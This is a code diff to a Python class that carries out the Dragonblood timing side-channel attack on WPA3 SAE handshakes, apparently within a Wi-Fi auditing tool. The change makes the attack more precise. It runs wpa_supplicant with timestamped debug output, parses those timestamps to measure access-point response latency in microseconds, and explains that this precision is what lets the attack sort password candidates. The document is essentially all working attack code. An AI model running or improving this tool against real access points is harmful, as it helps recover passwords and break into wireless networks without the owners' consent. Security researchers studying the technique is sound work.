@@ -22,6 +22,7 @@ References:
 """
 
 import os
+import re
 import time
 import tempfile
 import statistics
@@ -90,6 +91,10 @@ class DragonbloodTimingAttack:
 
     # Inter-probe delay (seconds) to avoid AP rate-limiting
     PROBE_DELAY = 1.5
+
+    # Leading epoch timestamp wpa_supplicant emits per debug line with ``-t``
+    # (e.g. "1609459200.123456: SAE: ..."). Microsecond resolution.
+    _LOG_TS_RE = re.compile(r'^(\d+\.\d+)')
 
     def __init__(self, interface: str, target_bssid: str, target_essid: str,
                  target_channel: int, sae_group: int = 0):
@@ -288,10 +293,26 @@ class DragonbloodTimingAttack:
 
     def _measure_sae_timing(self, config_file: str) -> Optional[float]:
         """
-        Run wpa_supplicant briefly and extract SAE exchange timing.
+        Run wpa_supplicant briefly and measure the SAE commit->response latency.
 
-        Parses debug output for timestamps around SAE commit/confirm
-        frames to calculate AP response latency.
+        Timing source: wpa_supplicant is run with ``-t`` so every debug line is
+        prefixed with a microsecond-resolution epoch timestamp stamped by
+        wpa_supplicant *when it processed the event*. The latency is computed
+        from those embedded timestamps (commit sent -> peer commit received),
+        NOT from when our Python loop happens to read the line. This removes
+        the readline/poll-sleep jitter (tens of milliseconds) that would
+        otherwise swamp the microsecond-scale Dragonblood signal.
+
+        If wpa_supplicant doesn't emit parseable timestamps (e.g. ``-t``
+        unsupported), we return None rather than a jitter-laden read-time
+        measurement — an honest "no sample" beats a misleading number.
+
+        NOTE: this is still a software-side measurement taken at the
+        supplicant, so absolute values include local stack latency. It is
+        adequate for the *relative* fast/slow partitioning across candidates
+        probed under identical conditions, which is what the timing attack
+        needs. For archived captures, the frame-timestamp path
+        (extract_timing_from_pcap / compute_pcap_response_times) is preferred.
 
         Returns:
             Latency in microseconds, or None.
@@ -301,12 +322,13 @@ class DragonbloodTimingAttack:
             '-i', self.interface,
             '-c', config_file,
             '-D', 'nl80211',
-            '-dd',  # Extra-verbose debug output
+            '-t',   # prefix each debug line with a us-resolution epoch timestamp
+            '-dd',  # extra-verbose debug output
         ]
 
         process = Process(cmd, devnull=False)
-        commit_sent_time = None
-        commit_received_time = None
+        commit_sent_ts = None
+        commit_received_ts = None
         start = time.monotonic()
 
         try:
@@ -317,36 +339,42 @@ class DragonbloodTimingAttack:
                 try:
                     line = process.pid.stdout.readline()
                     if not line:
-                        time.sleep(0.05)
+                        time.sleep(0.01)
                         continue
                     if isinstance(line, bytes):
                         line = line.decode('utf-8', errors='replace')
 
-                    # Detect SAE commit sent
+                    ts = self._parse_log_timestamp(line)
+
+                    # Detect SAE commit sent. Use wpa_supplicant's own
+                    # timestamp; ignore the event if it carries none (we
+                    # can't measure accurately without it).
                     if 'SAE: Sending commit' in line or \
                        'SME: Trying to authenticate with' in line:
-                        commit_sent_time = time.monotonic()
-                        log_debug('DragonbloodTiming',
-                                  'SAE commit sent detected')
+                        if commit_sent_ts is None and ts is not None:
+                            commit_sent_ts = ts
+                            log_debug('DragonbloodTiming',
+                                      'SAE commit sent detected @ %.6f' % ts)
+                        continue
 
                     # Detect SAE commit response received
-                    if commit_sent_time and (
+                    if commit_sent_ts is not None and ts is not None and (
                         'SAE: Peer commit' in line or
                         'SAE: Processing commit' in line
                     ):
-                        commit_received_time = time.monotonic()
+                        commit_received_ts = ts
                         log_debug('DragonbloodTiming',
-                                  'SAE commit response detected')
+                                  'SAE commit response detected @ %.6f' % ts)
                         break
 
                     # Early termination on auth failure
                     if '4-Way Handshake failed' in line or \
                        'CTRL-EVENT-AUTH-REJECT' in line or \
-                       'Authentication with' in line and 'timed out' in line:
+                       ('Authentication with' in line and 'timed out' in line):
                         break
 
                 except Exception:
-                    time.sleep(0.05)
+                    time.sleep(0.01)
 
         finally:
             import contextlib
@@ -356,11 +384,27 @@ class DragonbloodTimingAttack:
                 if process.poll() is None:
                     process.kill()
 
-        if commit_sent_time and commit_received_time:
-            delta_us = (commit_received_time - commit_sent_time) * 1_000_000
-            return delta_us
+        if commit_sent_ts is not None and commit_received_ts is not None:
+            delta_us = (commit_received_ts - commit_sent_ts) * 1_000_000
+            if delta_us > 0:
+                return delta_us
 
         return None
+
+    @classmethod
+    def _parse_log_timestamp(cls, line: str) -> Optional[float]:
+        """Parse the leading epoch timestamp wpa_supplicant emits with ``-t``.
+
+        Returns the timestamp in seconds (float) or None if the line has no
+        parseable timestamp prefix.
+        """
+        m = cls._LOG_TS_RE.match(line)
+        if not m:
+            return None
+        try:
+            return float(m.group(1))
+        except ValueError:
+            return None
 
     # ------------------------------------------------------------------
     # wpa_supplicant config helpers
